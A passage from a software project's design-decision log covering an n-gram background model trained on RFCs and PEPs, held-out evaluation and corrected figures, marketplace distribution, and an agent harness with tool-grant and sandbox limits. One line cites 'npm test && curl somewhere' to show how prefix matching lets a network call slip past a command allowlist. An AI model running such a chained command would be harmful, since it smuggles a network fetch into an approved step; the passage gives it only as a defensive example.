as scoring the output contract and the D4 tool allowlist rather than the reasoning, and got there
from ceiling rates; alpha gets there without being told which dimensions to suspect. `committal`
and `foreclosure` have intervals containing zero, which at seven runs means unmeasured rather than
weak. And all nine dimensions load the same direction on whether an artifact is pruned, which the
pairwise correlation matrix in `learn --correlation` cannot see: it reports max |r| = 0.51, so no
two dimensions are redundant with each other, while every one of them tracks the same latent
thing.

None of that changes `config/critic-rubric.yaml`. It is evidence for backlog item 60, which is the
owner's call, and rewriting anchors mid-corpus would split the 35 scored artifacts into two halves
that look comparable and are not. Same reason D8 gave.

## D10. Training on a document library, and the two agents that keep it from running the repo

**Asked.** Train against libraries of text and documents so the model is worth something. Have the
repository run its own agents for updates and code checks. Add an agent that trains weekly and a
subagent that stops it over-computing.

**Resolved.** All four, with the model on the analysis side of the D9 line and the two new agents
outside every run.

### What "training" means here, precisely

Modified Kneser-Ney over a document library, in the standard library, from scratch. Every
parameter is a count taken from a corpus this machine can point at. Nothing is downloaded: no
weights, no tokenizer, no corpus. That is what keeps it a description of a corpus rather than an
inference client that shipped its weights instead of a key, and it is why `analysis/pyproject.toml`
gained no dependency for any of it.

Not a transformer, and the reason is arithmetic rather than policy. A transformer trained from
scratch needs somewhere north of 10^8 tokens before its perplexity beats a well-smoothed 5-gram,
and a GPU to get there. Kneser-Ney reaches useful perplexity at 10^6 to 10^7 tokens, trains in one
pass on a CPU, and its parameters are inspectable: a suspicious score traces to the exact context
that produced it. On a weekly CPU job over a document library it is not the compromise, it is the
better model. (Chen & Goodman, 1999.)

### What it is for

T1, the consensus trap, is the one trap whose detector cannot see the thing the trap is about:
prose that reads like every other document on the subject. A background model can. Mean surprisal
under it is low exactly where the writing was predictable from everything else written on the
topic, and the per-token vector says which clauses those were, which is the form a T1 finding has
to take to be actionable.

Two properties decide whether the measure is worth anything, and both are reported rather than
assumed. It is **relative to the corpus**: against this repository's own docs, "it is important to
note that this is a comprehensive solution" scores as surprising, because the docs never write
that way, and against a general library it scores as generic. And **out-of-vocabulary words are
not evidence of originality**: a closed vocabulary maps invented words to `<unk>`, which is common
in the training data by construction, so a sentence of nonsense reads as unremarkable. Mean
surprisal is therefore taken over in-vocabulary tokens only, with the OOV rate beside it.

**First result, against the repository's own prose as a placeholder corpus.** Pruned artifacts
mean 8.16 bits, kept artifacts 8.13, permutation p = 0.74. T1-fired artifacts 8.23 against 8.12,
p = 0.25. Both null, and null is the better outcome: it says the detectors are catching something
the surface statistics miss, which is what a detector sweep is for. The corpus is 88,000 tokens,
far too small to conclude anything, which is exactly why `analysis/corpora.yaml` exists as a
checked-in manifest rather than a command-line path.

### The corpus manifest

Declared in `analysis/corpora.yaml`, not passed as an argument. A weekly job that takes a path
argument trains on whatever the argument said that week; one that reads a checked-in manifest
trains on something a diff can show changing. A manifest naming a path that is not there raises
`CorpusError` rather than training on the remainder, because a corpus that silently resolves to
zero files produces a perplexity that looks like a result.

### The ceiling is an object, not a timeout

`Budget` is consulted by the trainer rather than wrapped around it, and the difference is the
whole design. A refused `allows()` stops the read and seals the model that exists, with the reason
in its metadata: a legitimate model of a truncated corpus. A timeout kills the process and leaves
nothing, on the week the corpus grew rather than the week the code changed, which reads as flake
and gets the job disabled.

Four ceilings, each protecting a different failure: tokens against corpus growth, wall clock
against the runner's job limit, distinct n-grams against table growth (which tracks contexts, not
documents, so it climbs on a corpus that only got more varied), and resident set against the
runner's 7GB. `relieve()` clears only a size refusal, checked on the stored reason rather than the
caller's intentions, because clearing a wall-clock refusal would let one batch of work through
before the next check re-derived it and turn a hard ceiling into a leak.

**Two defects the tests caught, both of the kind that produce plausible numbers.** The counting
pass was charging every token twice, so it stopped at half the corpus the vocabulary pass read and
counted n-grams over words the vocabulary was never built from — the `<unk>` rate would have
climbed through training and perplexity would have improved the less of the corpus the model saw.
And `relieve()` originally cleared any refusal, which meant a wall-clock ceiling could be bought
back one `check_every` batch at a time. The docstring claiming otherwise was the worse half of
that bug.

### The two agents

`adhd-trainer` (Bash, Read, Glob, Grep) runs the weekly training and reports the four record
fields that each detect a specific failure: `tokens_seen` falling means the ceiling bit earlier,
`oov_rate` climbing means `min_count` is dropping words the artifacts are judged on,
`stopped_because` names a truncated corpus, and a discount row fallen back to `[0.75, 0.75, 0.75]`
means a count-of-counts was zero and modified Kneser-Ney degraded to the unmodified kind.

`adhd-governor` (Read, Glob, Grep) sets and audits the ceilings. **It has no Bash**, and that is
the point: a governor that can run the thing it governs will eventually run it to check, and the
check is the cost it exists to prevent. It raises a ceiling only from evidence in a record, never
above 5120MB or 1800s on a hosted runner, and prefers `min_count` and `order` over ceilings
because both cut the table superlinearly and are modelling decisions with a stated effect.

Neither is dispatched by a run phase. `adhd doctor` now knows the difference, and
`test/agents.test.ts` keeps them in a separate allowlist rather than relaxing the run agents' one:
the four run agents still carry no filesystem tool, and the two maintenance agents can carry no
network tool and no agent-spawning tool. Network on a scheduled job is the one way this repository
acquires an inference client without anyone deciding to.

### Self-running checks

`.github/workflows/maintenance.yml` runs every gate weekly against the default branch and opens or
comments on one labelled issue when a gate that passed last week fails. That is not redundant with
`test.yml`: `replay` and `frames --drift` measure the library against the recorded runs, so they
can start failing in a week nobody pushed anything.

Dependency state is reported and never applied. An unattended job that bumps a dependency and
merges it is a supply-chain path into a repository whose whole claim is that it runs no untrusted
code, and `test/boundary.test.ts` fails if either scheduled workflow gains a `git push` or an
`npm audit fix`.

### D10 amendment: where the corpus comes from

The manifest shipped with a disabled placeholder and the model trained on this repository's own
88,000 tokens, which proves the pipeline and measures nothing. Asked to make it actually train,
the choice was between a corpus the owner supplies by hand and one the job fetches. It fetches.

**RFCs, not literature.** The artifacts being scored are engineering arguments with a fixed shape:
a position, what it costs, what it forecloses, what would falsify it. That is the RFC genre almost
exactly — design rationale, trade-offs, security considerations, the paragraph explaining why the
obvious approach was not taken. A model trained on public-domain novels would faithfully report
that a branch artifact reads unlike a Victorian novel. True, and useless: T1 is consensus in
technical argument, so the background distribution has to be technical argument.

**The network ban moved rather than lifted.** D10 banned network in a scheduled job on the grounds
that a job which can fetch is a job which can fetch weights. That argument still holds, so the
capability was made small enough to check:

- Exactly one file in the repository imports a networking module, `analysis/scripts/fetch_corpus.py`.
  It sits outside `adhd_analysis/`, nothing imports it, and the package's own absolute ban is
  unchanged.
- It talks to one allowlisted host over https, refuses any response that is not `text/plain`, and
  refuses the file extensions weights arrive in (`.safetensors`, `.gguf`, `.ckpt`, `.pt`, `.onnx`,
  `.bin`, plus archives and shared objects).
- `test/boundary.test.ts` pins all of it, including that the list of network-reaching files is
  exactly one entry long. Adding a second is a test failure, not a review comment.
- Neither maintenance agent gained a network tool. The fetch is a workflow step; the agents still
  cannot reach anything.

The corpus is gitignored and cached in CI. A clean checkout has none, and `required: false` on the
entry means that checkout trains on repository prose rather than failing — the same reason the
first three entries exist.

**The first real run.** 492 RFCs plus the repository's own prose: 5.63M tokens, a 39,268-word
vocabulary, 5.41M distinct 4-grams, 57 seconds, 1413MB peak resident set. No ceiling bit, OOV fell
from 13-24% per artifact on the placeholder corpus to 1-5%, and every discount row is a genuine
modified-Kneser-Ney estimate rather than the `0.75` fallback. That fixes the ceiling arithmetic at
roughly **250MB and 10 seconds per million tokens at order 4**, which is now in the governor's
brief: at `Budget.weekly()`'s 5120MB the resident set binds at about 20M tokens, well before the
40M token ceiling does, so raising the token ceiling on a growing corpus changes nothing.

**And a result with the sign pointing the wrong way.** Pruned artifacts mean 9.62 bits against
9.59 for kept, p = 0.72 — null, and null is the better outcome, because it says the detectors are
catching something the surface statistics miss. But T1-fired artifacts mean 9.78 bits against 9.55
for the rest, p = 0.048, and **higher is less predictable**. T1 is the consensus trap. If its
detector were finding surface genericity, the artifacts it fires on would be the predictable ones.
They are the surprising ones.

The reading that fits the code: the T1 detector is a written rule over what an artifact *claims* —
whether its position is the one anyone would give — and not over how the artifact reads. Those are
different properties and this says so with a number for the first time.

The reading that also fits: two unpreregistered comparisons on 35 artifacts, 7 of them in the
fired group, and a nominal p of 0.048. `docs/EXPERIMENTS.md` refuses to act on figures like this
and so does this entry. It is a reason to want more runs, which is backlog item 1, and it is not a
finding. The report prints that caveat in its own output every time it prints the number, because
the number will otherwise be quoted without it.

## D11. Distribution: which marketplaces this can be on, and one it cannot

**Asked.** Get it onto the Claude marketplace, and onto every marketplace possible including
OpenAI's and Anthropic's.

**Resolved.** Live on the Claude Code plugin surface. Built and one secret away on npm and the
official MCP Registry. Refused on OpenAI, for a reason that is architecture rather than paperwork.

### There is no Anthropic marketplace to submit to, and that is not a problem

Claude Code ships Anthropic's own marketplace pre-registered and reserves its names
(`claude-code-marketplace`, `claude-plugins-official`, `anthropic-plugins` and others). There is no
public submission process for third parties. Distribution works the other way round: a marketplace
*is* a git repository with a `.claude-plugin/marketplace.json` in it, and users add it by name.

So this repository is now its own marketplace. `/plugin marketplace add drewc611/Ai-adhd`, then
`/plugin install adhd@adhd`. Nothing is pending and nobody has to approve it.

**A defect the packaging work exposed.** `dist/` is a build artifact and is gitignored, so a plugin
installed from the git source had an `mcpServers` entry pointing at a file that was not there. The
host would have reported `ERR_MODULE_NOT_FOUND` with a path inside its own plugin cache, which
tells a user nothing. `bin/adhd-mcp.mjs` now sits in front of it and prints what is missing and the
one or two commands that fix it, varying on whether `node_modules` is present. It deliberately does
not build: hosts start MCP servers without asking, and a server that runs `npm install` on first
start is a surprise with a network fetch in it.

**The plugin ships four agents, not six.** `agents/` also holds `adhd-trainer` and `adhd-governor`,
which maintain this repository's own background model. Shipping `./agents` wholesale would hand a
plugin user two agents referencing paths they do not have, so `plugin.json` names the four run
agents explicitly and a test fails if a maintenance agent appears in that list.

### The npm name decided itself

npm already serves `adhd` — a 2022 stub at version 0.0.0, description "unstable wip, do not use
atm". Publishing under it returns a 403 that reads like a permissions problem rather than a name
collision. Backlog item 72 called the name the owner's decision; the registry made it. The package
is `ai-adhd`, matching the GitHub repository, and the CLI binary is still `adhd`.

### The registry order is load-bearing

`.github/workflows/release.yml` fires on a `v*` tag: gates, then npm, then the MCP Registry. npm
first because the registry proves package ownership by reading `mcpName` out of the published
`package.json` and checking it matches the server name being claimed. Reversed, the publish fails
naming a missing field rather than the race that caused it.

The registry step needs no secret. It authenticates with GitHub OIDC, which is what proves the
`io.github.drewc611/*` namespace: that namespace is claimable only by a workflow running in a
repository owned by drewc611. npm has no equivalent path, so `NPM_TOKEN` is a stored secret and is
the one thing here the repository cannot create for itself. Until it exists a tag fails at that
step with exactly that sentence.

Four files carry the version — `package.json`, `server.json`, `plugin.json`, `marketplace.json` —
and they disagree silently. `test/marketplace.test.ts` checks them against each other on every
run, and the release workflow checks all four against the tag before publishing anything.

### OpenAI is refused, and not for want of an account

The ChatGPT app directory takes MCP servers. Its requirements are a stable publicly reachable
HTTPS endpoint serving `/mcp`, domain verification through a token at
`/.well-known/openai-apps-challenge`, developer identity verification, and an organisation role
carrying Apps Management write.

The first one does not survive contact with D2. This MCP server is stdio and local because the
*host* supplies inference by spawning isolated subagents; the server compiles briefs and validates
contracts and never calls a model. A hosted remote server has no subagents to spawn, so it would
have to call one to do anything — the inference client CLAUDE.md bans on its first page. And D2's
argument is not about cost or vendor lock-in: branch isolation is a property of separate context
windows, and a remote server holding one conversation has none. Publishing there would mean
shipping something that demonstrates the opposite of what this repository claims.

The other three are things only the owner can supply: a domain they control, their own verified
identity, and a role assignment in their OpenAI organisation. They are not the reason for the
refusal, but they would each independently block it.

The nearest thing that is possible: any MCP host that reads the official registry will find this
server once the npm publish lands, and that includes hosts other than Claude Code. That is
distribution to the MCP ecosystem, which is the part of "everywhere possible" that does not require
becoming a different project.

### D11 amendment: three surfaces that needed nothing after all

Asked again where this could be published, the useful answer was not a longer list of directories.
It was that two of the venues written off as needing a credential do not.

**GitHub Packages takes `GITHUB_TOKEN`.** Minted per run, gone when the job ends, nothing stored
and nothing to rotate. It is a second home for the same tarball rather than a substitute for npm —
it requires an authenticated `npm install` even for a public package, so it reaches people who
already have a token and not the `npx` case. The package name is rewritten to `@drewc611/ai-adhd`
for that step alone, because the registry requires the scope to match the owner and the npmjs name
is unscoped on purpose, and restored afterwards so the next step and the README's install line
still refer to the same thing.

**PyPI does not need a token either.** Trusted publishing exchanges a GitHub OIDC identity for a
credential that expires within fifteen minutes, so the thing an attacker could steal from this
repository does not exist. It needs one web form naming this repository, this workflow and the
`pypi` environment. `publish-python.yml` fires on `analysis-v*` rather than `v*`: the analysis
package has its own version for its own reasons — `pyproject.toml` at 0.1.0 against `package.json`
at 0.0.1 — and a shared tag would force a release of one whenever the other moved.

**`CITATION.cff` costs a file** and makes GitHub render a citation immediately. It carries no email
address: an author is identified by name and alias, and an address in a public repository is a
mailing list subscription nobody asked for. Zenodo reads the same file whenever the owner
authorises it, which is the route that makes the reliability and T1 findings citable rather than
merely linkable.

The MCP directories — Glama, Smithery, mcp.so, PulseMCP — read the official registry, so none of
them is worth chasing before that entry exists. Glama auto-indexes open-source servers from GitHub
and may take this without being asked. Checked live: none has indexed this repository yet, and
`ai-adhd` and `adhd-analysis` are both still available.

`NPM_TOKEN` remains the single secret this repository cannot create for itself, and it now blocks
exactly one surface rather than two.

## D12. The SuperAgent: a harness for hours of work that still never reasons

**Asked.** A SuperAgent that researches, codes and creates, using sandboxes, memory, tools, skills,
subagents and a message gateway, handling tasks that take minutes to hours.

**Resolved.** Built as a layer above the kernel, with all six pieces, and with the three
CLAUDE.md non-negotiables holding unchanged. Two of the six pieces turned out to be the interesting
part, and not for the reason the ask suggests.

### Above the kernel, not inside it

`src/os.ts` already schedules long multi-agent work: leases, heartbeat, drain, priority, budgets,
a journal. Its `phase` enum is the four ADHD phases, and widening that enum to hold `research` and
`build` would weaken the invariants the enum encodes.

So a mission owns a stage graph and, when a stage needs a hard decision made well, submits an
ordinary run to the kernel and adopts the synthesis. `decide` is a stage kind that spawns no
agent. That is the whole reason a mission beats a long prompt: the decision is made by N isolated
frames and a blind critic instead of by one agent being thorough, which is the thing this
repository is.

### Memory and the gateway are the same problem twice

The ask lists them as features. They are the two mechanisms by which a sibling's output would reach
a branch, which makes them the two ways to lose the property the architecture exists to
demonstrate — and to lose it through components nobody was watching, because a memory store has a
database's air of neutrality and a message bus reads as plumbing.

So both refuse, mechanically and at the point of delivery rather than on read:

- `Memory.forBrief` withholds every entry written by a `diverge` participant from every `diverge`
  brief. Global scope does not exempt it, and neither does coming from a different run: a branch
  of last week's run is still a branch, and its conclusion on a related question is exactly the
  anchor being defeated. The brief is told the count and never the content, because a list of
  titles is a list of what siblings thought worth writing down.
- `Gateway.send` refuses any delivery whose two ends are both `diverge` participants, in either
  direction, and journals the refusal. Direction does not matter: a branch asking a sibling a
  question leaks the question, and a question is a claim about what the asker thinks matters.
  Refused at send rather than dropped on read, because a message accepted and then hidden is a
  message the sender believes arrived.

`adhd super memory --audit` and `adhd super gateway <mission>` report what each rule actually did.
A gateway that has never refused anything is one whose rule is not being exercised.

### The sandbox is not a security boundary and says so

A stage with Bash walks out of any directory this creates. Claiming otherwise would be the more
dangerous error, because someone would then rely on it.

What it is: an honest stage's work made reviewable and revertible. Changes in one place, a diff by
content hash rather than mtime (`cpSync` does not preserve mtimes across filesystems, so an mtime
diff reports the whole tree on some machines and nothing on others), and one deliberate promote
back. `promote` checks every path against the writable list before moving anything, so a refusal
moves nothing — a partial promote leaves a tree matching neither the sandbox nor the source.

The command allowlist matches the whole command string. Prefix matching on `npm test` lets
`npm test && curl somewhere` through, and a verify stage runs what it is told.

### Two tool-grant holes the doctor check found on its first run

`adhd doctor` gained a check comparing `STAGE_TOOLS` against the agents' own front matter in both
directions, and it failed immediately on the code that had just been written.

`review` was mapped to `adhd-critic` and `diverge` to `adhd-branch`. Both are run agents whose
grant is fixed by D4 at `TaskList` and nothing else, so the stage grants either had to be empty or
had to widen an agent whose emptiness is the point. Fixed by giving `review` its own agent and
`diverge` none.

`build` and `verify` were one agent. A tool grant is per agent, so one agent serving both kinds
carries the union — and the union means a verify stage can write. **A stage that checks its own
work and can edit it is not a check.** Split into `adhd-builder` and `adhd-verifier`, and
`test/agents.test.ts` derives the expected grants from `STAGE_TOOLS` rather than restating them,
so a stage kind that gains a tool fails until its agent declares the same one.

### The gate, and the reason it is dumb on purpose

Every stage names its artifact, required headings, a word floor and optionally a command that must
exit zero, all fixed before the stage runs. `verifyStage` runs exactly that. Nobody judges whether
the artifact is good: "good" is what the review stage is for, and a gate that asks for it passes
whatever it is given.

`assertNoReasoning` runs on every brief the planner emits and on every orchestrator message. An
orchestrator that formed a view would put it in every brief it compiled, and every stage
downstream would reason from a premise nobody scored — the anchor arriving through the one
component that talks to everything.

`goal_hash` is checked on every return, aborting with `GOAL_HASH_MISMATCH` at exit code 3. A
worker returning against a paraphrased goal is the mission-level `problem_hash` drift.

### Classes, and what minutes-to-hours means concretely

`quick` is research and a write-up. `standard` adds the divergent decision and a build behind it.
`deep` adds a second research stage **after** the divergence, because the most common way an
hour-long piece of work goes wrong is committing to a direction chosen before the hard part was
understood, and the second pass is where the branches' disagreement gets checked against the world
rather than against each other.

Leases and budgets come from the class rather than a flag, and everything is on disk: a mission
that takes an hour outlives the process that started it, so the record is the truth and the object
is a view of it. A test starts a second `SuperAgent` on the same root and resumes mid-mission.

`plan` prints the graph and stops. D5 said a system that spawns seven subagents and gives the user
no way out fails its own fixture 001; a deep mission is seven stages, one of which is itself a
seven-branch run, so the objection applies with an order of magnitude on it.

## D13. Held-out evaluation, and what it found in its own first run

**Asked.** Keep training.

**Resolved.** Corpus to 1,974 RFCs (117MB, 22.9M tokens), and a held-out evaluation so that
"trained more" has a way to be wrong. The evaluation found two defects and reversed one modelling
conclusion, including the one it produced itself.

### "More tokens" was a claim with no failure mode

The trainer reported vocabulary size, n-gram count and wall clock. **All three rise when a model
gets worse**: a model that memorises its corpus has the largest table available and the best
training-set perplexity. Nothing measured generalisation, so every training run was an improvement
by construction.

`evaluate.py` holds out one document in twenty by a deterministic stride and scores the model on
text it never saw. Two properties are load-bearing and both are easy to lose:

- **The vocabulary comes from the training half only.** `SplitLibrary` yields one side, so
  `train()` never sees the other. Building it over everything hands the model every word it is
  about to be tested on, and the OOV rate collapses for a reason unrelated to the model.
- **The stride is over documents, never sentences.** Two sentences from one RFC share a topic, an
  author and a vocabulary, and splitting inside a document leaks all three.

### Order 4 is right, and the first run said so for the wrong reason

Over 21.8M training tokens, scored on the same 1,088,715 held-out tokens:

| order | n-grams | held-out perplexity | peak RSS | seconds |
|---|---|---|---|---|
| 3 | 7.5M | 46.2 | 1.9GB | 102 |
| 4 | 16.7M | 38.6 | 4.9GB | 207 |
| 5 | 27.8M | **36.0** | 9.2GB | 340 |

Order 5 has the best perplexity. Order 4 is still the default, because 3→4 buys 16.4% for 2.2x the
table and 4→5 buys 6.8% for another 1.7x and 9.2GB — past `Budget.weekly()`'s 5120MB. Order 5 does
not fit a hosted runner at this corpus size and order 4 fits with about 200MB to spare. That trade
is now a measured table in the governor's brief rather than the assertion it had been.

**The first run of that comparison reported order 5 at perplexity 101.1 and called it the worst.**
Its own output gave it away: the vocabulary was identical across all three orders and the OOV rates
were not, which is impossible on one held-out set. Scoring is deeper per token at a higher order,
so the wall-clock ceiling shared with training truncated order 5's evaluation and not order 3's,
and three orders were ranked on three different slices of text. Had nobody read the OOV column, the
repository would have adopted a conclusion that is the reverse of the truth.

`comparable()` now refuses to print a ranking when the held-out token counts differ or any
evaluation was cut short, and scoring gets its own wall-clock allowance.

### Loading a model was outside the budget entirely

`Budget` governed reading a corpus and counting n-grams, and nothing about reading the result back.
A model trained under a 9.5GB ceiling was then loaded into a process that reached 11.9GB, because
the table is rebuilt in memory and nothing was watching that path.

`KneserNey.load` now takes an optional budget. `Budget.touch()` exists because `spend(0)` never
advances the counter that gates the periodic memory check, so a `spend(0)`-based loop would have
looked correct and checked nothing — a load spends memory and no tokens.

The governor's brief now says scoring costs about as much memory as training, because a ceiling
sized for training alone is a ceiling that bites during evaluation, which is exactly how the order
comparison went wrong.

### The T1 result survived the corpus increase

Retrained at order 4 on the full corpus: 22.9M tokens, 101,051-word vocabulary, 17.4M 4-grams,
206 seconds, 4710MB peak, no ceiling bit, training OOV down from 2.7% to 0.4%.

- **Pruned against kept**: 9.72 bits against 9.74, p = 0.87. Null, as before, and the tiny
  difference flipped sign — which is what noise looks like.
- **T1 fired against the rest**: 9.94 against 9.68, +0.261 bits, p = 0.0455. On 492 RFCs it was
  +0.226 at p = 0.048.

Quadrupling the background corpus is an independent perturbation, and an effect that was an
artifact of a thin corpus would have washed out rather than strengthened. Per-artifact OOV fell
from 13–24% to 1–5%, so far less of each artifact is now being scored as `<unk>`.

**This does not fix the sample.** It is the same 35 artifacts with 7 in the fired group, so the
p-value carries the caveat it always did: a bigger corpus tests the measure, not the sample.
Backlog item 1, multi-seed replay, is what would test the sample. The report prints that caveat
beside the number every time it prints the number.

### The weekly job now reports it

`train.yml` computes held-out perplexity after training and uploads it with the record, so a week
where the model degrades is visible as a number that went up rather than as three numbers that all
went up as usual.

## D14. Four corpora, one stable effect size, and three of my own numbers corrected

**Asked.** Keep training on piles of text.

**Resolved.** The corpus is now 6,067 documents and 283MB across three sources; the model trains on
all 55.4M tokens of it unpruned. The training produced one result worth having and three
corrections to figures this repository had already published.

### The model

| | tokens | vocab | n-grams | pruned | peak RSS | seconds |
|---|---|---|---|---|---|---|
| 1,974 RFCs | 22.9M | 101,051 | 17.4M | no | 4.7GB | 206 |
| mixed, ceilings wrong | 40.0M | 138,289 | 12.5M | **yes, 8.9M dropped** | 4.2GB | 245 |
| mixed, ceilings right | **55.4M** | **177,507** | **36.5M** | no | 9.5GB | 622 |

Held-out perplexity **6.06** on 3,097,500 tokens, OOV 0.15%, fingerprint `8487cc7ab947fef6`. No
ceiling bit on either pass.

> **Corrected in D16: 6.06 is not held-out perplexity.** That model trained on every document in the
> manifest and was then scored on one document in twenty of the same manifest, so the figure is a
> memorisation score. The OOV rate printed beside it is the tell — 0.15% against the 0.79% an unseen
> set gives. Left in place rather than edited out, because the tell was visible every time and read
> as good news.

### The T1 effect size is stable; its p-value is not

Four corpora, spanning 10x in size and one change of genre:

| corpus | tokens | difference | p |
|---|---|---|---|
| 492 RFCs | 5.6M | +0.226 bits | 0.048 |
| 1,974 RFCs | 22.9M | +0.261 | 0.0455 |
| mixed, pruned | 40.0M | +0.224 | 0.0950 |
| mixed, unpruned | 55.4M | +0.243 | 0.0780 |

**The difference sits between +0.22 and +0.26 bits every time.** The p-value wanders across the 0.05
boundary and never clears it decisively. Pruned against kept stays null throughout, and its tiny
difference changes sign between runs, which is what noise looks like.

That is a consistent but underpowered signal, and it is a better description than either of the two
this repository gave before. After the RFC-only 4x it said the effect had *survived a corpus
increase*; when the genre-diverse corpus moved p to 0.095 it said the effect had *weakened*. Both
read the p-value as the finding. The effect size did not move in either direction — 10x the text and
a new genre changed it by 0.04 bits. What is underpowered is n=7 in the fired group against 28, and
no amount of background text fixes that. Backlog item 1, multi-seed replay, is the only thing that
would.

### Correction 1: grams-per-token was 0.53 and is 0.66

D13's amendment and the governor's brief said the mixed corpus produced 0.53 distinct 4-grams per
token against 0.76 for RFC-only text. The real figure is 0.66.

The error is instructive. It was derived from the *pruned* run by adding the counts-of-counts
snapshot's `n1` (8,880,187) to the final table size (12,453,345). But that snapshot counts singletons
inside the table at the moment of pruning, not every singleton the run ever saw — counting continued
afterwards — so the sum understates the total and the true pre-prune count is not recoverable from
that record at all. **Arithmetic on a pruned run's totals is arithmetic on what survived.**

### Correction 2: budget memory per n-gram, not per token

The stable quantity is **~265MB per million n-grams**: 270 on the RFC-only run, 260 on the mixed
one. Per *token* it looks unstable only because grams-per-token varies with the corpus. So the memory
a run needs is `grams_per_token × tokens × 265MB/M`, and the first factor is measured rather than
carried over.

### Correction 3: 17.4 was not an improvement on 38.6, and 6.06 is

`comparable_heldout` was added because 38.6 on the RFC-only held-out set and 17.4 on the mixed one
were about to be read as a 2.2x gain when they are numbers about two different tests.

> **Weakened by D16.** Both figures below are memorisation scores, so 2.9x is a ratio between two
> numbers that do not measure generalisation. Pruning's real cost is probably larger, since a pruned
> model has less of the tail to memorise *and* less to generalise from, but that is an argument and
> not a measurement. Re-measuring it needs two runs on one split and is backlog item 76.

The pruned and unpruned mixed runs were scored on the *same* set, so **17.4 against 6.06 is a real
comparison**, and it puts a number on what the pruning cost: pruning singletons removes the tail
modified Kneser-Ney does most of its work on, and corrupts the discount estimates that tail
provides. A 2.9x perplexity penalty for an economy that saved 7GB of memory the run was not using.

### What the corpus is, and what it is not

4,901 RFCs, 615 PEPs, 529 EIP *files*. The PEPs and EIPs are CC0 or public domain and the RFCs are
not, which is recorded in `docs/PROVENANCE.md` along with the position that matters: nothing is
redistributed, so the question is use rather than distribution.

**Corrected in D15: 225 of those 529 EIP files were 130-byte forwarding stubs, so the real count was
304 documents.** The wrong number is left above rather than edited out, because what it was wrong
about is the point — a file count is not a document count, and nothing here checked.

The mixed corpus is more *genre*-diverse and less *n-gram*-diverse than RFC-only text, which is
counterintuitive and measured: 0.66 grams per token against 0.76. PEPs and EIPs share a template.
Adding text is not the same as adding variety, and the ratio is how to tell which one happened.

**Also corrected in D15:** blaming genre for all of that gap was wrong. A third run on the same genre
mix at 68.0M tokens gives 0.62, so the ratio falls with corpus *size* as well, and by more than the
genre difference accounts for.


## D15. A 68M-token corpus, a third memory point, and two ceilings that could bind in silence

**Asked.** Keep training on piles of text.

**Resolved.** The existing sources were exhausted at the ranges already probed, so growing the pile
meant either new sources or a wider network boundary. Both were available and only one was taken.

### The corpus

7,344 documents and 351MB across four third-party sources, up from 6,067 and 283MB.

| source | files | bytes | licence |
|---|---|---|---|
| rfc | 6,330 | 335,047,210 | IETF Trust, BCP 78 |
| pep | 615 | 11,785,368 | public domain and CC0-1.0 |
| eip | 323 | 3,016,476 | CC0-1.0 |
| erc | 54 | 882,724 | CC0-1.0 |

The 1,429 new RFCs came from a source already in the allowlist, stopped by a byte ceiling rather than
a request budget: probing is about 95% efficient there, 1,429 fetched against 71 missing. The ERCs
are new and small, and the reason for adding them was never volume.

### 43% of the EIP corpus was not a document

225 of its 529 files were 128 to 132 bytes — four lines of front matter and "This file was moved to
.../ERCS/erc-N.md" — left behind when Ethereum moved application-layer standards into
`ethereum/ERCs`. That corrects a count this repository published in D14 and the README: 304 real
documents, not 529.

The count is the smaller half. 225 copies of identical four-line boilerplate were in the training
text of a model whose only job is to say how predictable a document is. That is not a neutral absence
of text; it is the most template-like prose available, and it was teaching the background model that
engineering documents repeat themselves. The fetcher refuses a stub on arrival and sweeps cached ones
out of the corpus directory — a sweep rather than a check inside the probe loop, because whether a
stub gets removed should not depend on whether that run's spread landed on its number. The first
version did it in the loop and left 214 of 225 in place.

### The model

| | tokens | vocab | n-grams | grams/token | peak RSS | MB/M grams | seconds |
|---|---|---|---|---|---|---|---|
| 1,974 RFCs | 22.9M | 101,051 | 17.4M | 0.76 | 4.7GB | 270 | 206 |
| mixed, unpruned | 55.4M | 177,507 | 36.5M | 0.66 | 9.5GB | 260 | 622 |
| **mixed + ERC** | **68.0M** | **205,907** | **42.4M** | **0.62** | **10.9GB** | **257** | **718** |

`prunes: 0`, no ceiling bit on either pass, `vocab_truncated: {types: 0, tokens: 0}`.

Held-out perplexity **6.396** on 3,464,186 tokens at 0.13% OOV, fingerprint `92cedd81b2261713`.

> **Corrected in D16: same defect as 6.06.** Trained on all 7,344 documents, scored on 368 of them.
> The honest figure for this corpus at order 4 is **26.29**, measured on a model that trained on the
> other 6,976. Everything else in D15 — the table sizes, the memory law, the T1 differences, the
> vocabulary finding — is unaffected: none of it depends on the perplexity.

**That is not an improvement on 6.06 and not a regression from it.** A larger corpus means a
different stride split, so the fingerprint changed and `comparable_heldout` refuses the comparison —
which is the function doing its job rather than an inconvenience. The two numbers are about two
different tests, and the smaller one may simply be the easier set. Comparing them is the mistake D14
recorded and this is the first run where refusing it costs something.

### Grams-per-token falls with size, not only with genre

D14 said 0.66 against 0.76 was because "PEPs and EIPs share a template". This run rules that out as
the whole explanation: it is the same genre mix, it has a slightly *higher* RFC share (95.4% of bytes
against 94.0%, which should push the ratio back toward 0.76), and the ratio fell again to 0.62. More
text means more n-grams already seen. Genre matters too, and it is not the whole story — a memory
estimate that extrapolates a small run's ratio to a large corpus will over-provision.

MB per million n-grams is the stable factor: 270, 260, 257 across a 2.4x range in table size.

### The T1 effect across five corpora

| corpus | tokens | difference | p |
|---|---|---|---|
| 492 RFCs | 5.6M | +0.226 bits | 0.048 |
| 1,974 RFCs | 22.9M | +0.261 | 0.0455 |
| mixed, pruned | 40.0M | +0.224 | 0.0950 |
| mixed, unpruned | 55.4M | +0.243 | 0.0780 |
| mixed + ERC | 68.0M | +0.211 | 0.1339 |

Twelve times the corpus and the difference stays between +0.21 and +0.26 bits. The p-value has now
wandered to 0.134, which is further from 0.05 than any earlier run, and reading that as the effect
weakening would be reading the p-value as the finding — the mistake D14 already had to correct once.
What it is is a small effect measured on 7 artifacts against 28. **Background text is not the
constraint and never was.** Backlog item 1, multi-seed replay, is the only thing that moves n.

Pruned against kept stays null: −0.074 bits, p = 0.51, and its sign has changed between runs. That is
what noise looks like.

### Two ceilings that could have bound in silence

Neither was found by a failing test. Both are the same class as the truncated tables D13 and D14 had
to correct.

**The weekly job wrote the corpus where nothing reads it.** `fetch_corpus.py --out` is the parent
directory and each source gets a subdirectory, so `--out corpora/rfc` produces
`corpora/rfc/rfc/*.txt` while `corpora.yaml` reads `corpora/rfc/*.txt`. Verified rather than
inferred, with a one-probe run. Every third-party entry in the manifest is `required: false`, which
is what makes a clean checkout trainable and also what makes this silent: the loader shrugs, training
